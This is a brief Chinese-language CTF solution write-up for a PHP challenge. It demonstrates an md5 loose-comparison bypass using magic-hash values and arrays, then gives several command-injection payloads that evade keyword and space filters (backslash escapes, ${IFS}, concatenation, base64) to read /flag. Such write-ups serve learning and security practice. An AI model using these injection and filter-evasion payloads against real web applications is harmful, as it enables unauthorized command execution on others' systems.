# 解题方法

很简单的md5弱等于和数组

 由于不是`===`，那么0e开头、后面全是数字的md5都为0，我们可以传入一个经过md5加密后为0e的值即可

```
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
```

 当传入数组时返回NULL，但两个的值还是相等的

![](https://files.catbox.moe/n0jq5l.png)

过滤了flag，ls，空格，cat，使用`\`来绕过关键字符串，使用`${IFS}`来绕过空格

`cmd=system("l\s");`

![](https://files.catbox.moe/qkjifl.png)

`cmd=system('l\s${IFS}/');`

`cmd=system('c\at${IFS}/fla\g');`

![](https://files.catbox.moe/qjtoe3.png)

`cmd=$a='ca';$b='t';$c='<>/fl';$d='ag';system($a.$b.$c.$d);`

方法太多了，还可以base64解密

`system(base64_decode(Y2F0IC9mbGFn));`

